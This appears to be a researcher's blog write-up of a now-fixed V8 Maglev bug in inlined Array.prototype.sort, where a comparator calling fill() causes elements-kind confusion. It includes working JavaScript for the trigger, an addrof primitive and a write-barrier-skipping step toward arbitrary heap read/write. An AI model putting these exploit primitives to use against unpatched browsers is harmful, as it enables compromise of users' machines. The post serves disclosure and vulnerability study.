---
layout: default
title: When Sorting Leads To Confusion
date: 2026-08-28
permalink: /v8/when-sorting-leads-to-confusion/
---

# When Sorting Leads To Confusion

## Introduction
In this blogpost I will discuss a chrome 0 day I found and reported in early August 2026 (CVE pending, come on google...), a v8 bug in the compilers that leads to an array containing `PACKED_ELEMENTS` to receive the map `PACKED_SMI_ELEMENTS`, this can be turned into arb r/w on the js heap. The bug was present in both maglev and turbofan, but we will focus on the former.

I chained this bug with an n-day sandbox escape and flagged the v8CTF.

### Target
- Introduced in: `66a3f1e94d4b681bff6476a876067a3c79a853f0`
- Fixed in: `e0562d87ad9c17042b581582c99237d798572e67`


## The Bug
### Inline sort

The bug is in `maglev/maglev-graph-builder.cc` `TryReduceArrayPrototypeSort`, when maglev generates its CFG it can try to replace some call to builtins function with specialized version. As the name `TryReduceArrayPrototypeSort` suggests, here maglev check if it is possible to replace a call to `Array.prototype.sort` with a much simpler insertion sort that gets inlined.

The inserted code will more or less look like this:

```c++
checkReceiverMaps();
temp = copy(receiver.elements);
insertionSort(temp, comparefn);
checkReceiverMapsAndLength();
copy(temp, receiver.elements);
```

The comment at the beginning of the function describes the process in more details:

```
// Inline a small insertion-sort directly into the Maglev graph, avoiding
// the builtin -> JS transition overhead on every comparefn call inside
// TimSort.
//
// Preconditions (all checked before any graph commitment):
//  1. CanSpeculateCall()
//  2. receiver has known PACKED_SMI or PACKED maps (holey arrays excluded
//     because holes require special treatment the insertion sort does not
//     implement; PACKED_DOUBLE excluded so deopt continuations stay simple
//     -- see below)
//  3. a comparefn is provided (args[0])
//  4. comparefn is a statically-known interpreted JSFunction
//  (HasBytecodeArray);
//     deopts from the inlined call body are handled by the
//     ArraySortContinueFromSnapshot{Eager,Lazy}DeoptContinuation builtins,
//     which feed the temp_array snapshot to the generic PowerSort tail.
//
// The sort operates on a temporary FixedArray copy of the receiver's
// elements.  This temp_array is the "_items_" snapshot from
// ECMA-262 23.1.3.30: comparefn side effects on the receiver do not
// affect the sort result.
// <...>
//
// For arrays with length > kMaxInlineSortSize the slow path calls the sort
// builtin normally so that large arrays are unaffected.
```

Let's see those preconditions one by one:
- `CanSpeculateCall()`: call feedback starts with `kAllowSpeculation`, V8 might disallow speculation after a call site multiple time deopts.
- Receiver has known PACKED_SMI or PACKED: this optimization only supports those 2 array kinds.
- A compare function must be provided, and must have bytecode.
- kMaxInlineSortSize is 16, array with more elements will use the normal builtin.

The sorting won't happen in place but rather on a temporary FixedArray, this is because in js every function can have side effects,
which includes the comparator function we give to sort. The comparator might infact, for absolutely no good reasons at all, modify the array we are trying to sort.

Once the sorting is done the elements from temp array are copied back into the original one.

### Mixed elements kind feedback

```js
function confuse(arr){
    function compare(){
        return 0
    }
    arr.sort(compare);
}

for (let i = 0; i < 1000; i++){
    confuse([6,9,4,2,0])
    confuse([{},{},{}])
}
```

According to what we have read, when `confuse` gets compiled by maglev, it should work with both array types, given that it was trained with both of them.
For maglev the possible_maps are `PACKED_SMI_ELEMENTS`, `PACKED_ELEMENTS` both layouts use tagged FixedArray slots, so Maglev accepts them together.

Now let's see what happens when the sorting is done and it's time to copy back the elements.
```c++
// Guard: comparefn side effects may have changed the receiver's map or
// length.  Check once here before the copy-back (the sort loop only
// touches the temp array, so in-loop checks are unnecessary).
if (receiver_maps_were_unstable) {
    // simplified code
    RETURN_IF_ABORT(AddNewNode<CheckMaps>(
        {receiver}, receiver_maps_before_loop,
        CheckType::kOmitHeapObjectCheck));
}
```

The comment says that we need to check the original array map since the comparator might have changed it.
But can you spot the problem?

The code **doesn't check if the map changed**, it simply checks that the current array map is **any** of the maps in `receiver_maps_before_loop`.
This means that as long as the map changes into any other map in `receiver_maps_before_loop`, the check will pass.

Since the inline function works only with `PACKED_SMI_ELEMENTS` and `PACKED_ELEMENTS`, and we have trained the function with bothit means we can switch between those 2.
Going from `PACKED_SMI_ELEMENTS` to `PACKED_ELEMENTS` wouldn't be really useful, so we need to go the opposite direction.

### Triggering it with fill

But is that even possible?

In V8 an array generally goes from a "specialized" map to more general ones, for instance if you have `a = [1,2,{}]` changing the third element `a[2] = 3` doesn't change the array from `PACKED_ELEMENTS` to `PACKED_SMI_ELEMENTS`. Reassigning the array `a = [1,2,3]` would change what a points to, but it would not change the original array, and the `receiver` (aka what sort was called on) dosn't change.

So we need something that acts in place and can replace maps. The candidate for this is `array.fill()`

Looking at `src/builtins/builtins-array.cc` we can read a comment inside the `is_replacing_all_elements` branch that explicitly says

```
// For the case where we are replacing all elements, we can migrate the
// map backwards in the elements kind chain and ignore the current
// contents of the elements array.
```
When `Array.prototype.fill` replaces every element, none of the old values will survive. V8 can therefore choose the optimal elements kind for the new value.
For Smi and object elements, both backing stores are FixedArrays containing tagged slots. So the backing store does not need to be reallocated:

```c++
JSObject::SetMapAndElements(isolate, array, new_map, elements);
```

Bingo!

```txt
Before comparator:
    receiver.map = PACKED_ELEMENTS
    temp         = [object pointers]

Inside comparator:
    receiver.fill(0)
    receiver.map = PACKED_SMI_ELEMENTS
    receiver     = [0, 0]

After copy back from temp:
    receiver.map = PACKED_SMI_ELEMENTS
    receiver     = [object pointers]
```

## Exploitation
### addrof

Now if you trigger the bug you can observe some funny behavior.

```js
function confuse(arr){
    function compare(){
        arr.fill(0);
        return 0
    }
    arr.sort(compare);
}

for (let i = 0; i < 1000; i++){
    confuse([6,9,4,2,0])
    confuse([{},{},{}])
}

let bad = [{},{}]

confuse(bad);

console.log(bad)    //8901784,8901802
console.log(bad[0]) //[object Object]
```

When printing the array, it leaks the heap offset of the objects, but accessing the single elements returns them normally lol.

But why?
Well, the array now has the `PACKED_SMI_ELEMENTS` map, so calling functions that depends on the array map will treat the elements as Smis, while for any other access the tagged elements is returned. This is already enough to craft the `addrof` primitive.

```js
function addrof(target) {
  let sacrificial = [target,target];
  confuse(sacrificial);
  return (Number(String(sacrificial).split(',')[0]) << 1) | 1
}
```

### Skipping the write barrier

But what about the `fakeobj` primitive? If you have some experience with V8 pwn, you know that generally to get `fakeobj` you simply do the opposite you did for `addrof`, however in this case it's not possible, if you write now a number into a confused array slot, it will still be a Smi. Even if you do the confusion the other way around (Smi to packed elements) you still would have an array containing legit Smis, we can't touch the least significant bit (or at least i was not able to).

The only way i found to do it, is by making V8 skip a `write barrier`: all operations that depend on the confused array map will be done as if it were an array of Smis, so if we move a tagged pointer treating it as a Smi, no write barrier will be emitted!

The easiest way to do it is by inserting a new element in the array and making all the other elements shift, `Array.prototype.unshift` does exactly that:

```text
The unshift() method of Array instances adds the specified elements to the beginning of an array and returns the new length of the array.
```

If the array has enough capacity this will cause the shift of all the other elements without reallocating!

```js
function trash() {for (let i = 0; i < 36; ++i) new Array(0x1000).fill(1.1);}

let bad = [{},{},69];
bad.pop(); // [{},{}, <free slot>]

trash(); // promote bad to Old Space
trash();

bad[1] = {x:420}; // old -> young

confuse(bad)

bad.unshift(0); // [0, {}, {x:420} <- skipped write barrier]
```

At this point getting arb r/w on the heap should be trivial, you only need to trigger minor gc and reclaim bad[2] with a fake array, same as [my other blog post](https://serotav.github.io/Writeups/v8/cve-2026-15776-from-regex-to-rce/).

## The Fix
The fix was simply to not inline Array.prototype.sort on mixed elements kinds. Overall i say a quite fun and interesting bug, with a non trivial way to actually get fake obj to work.
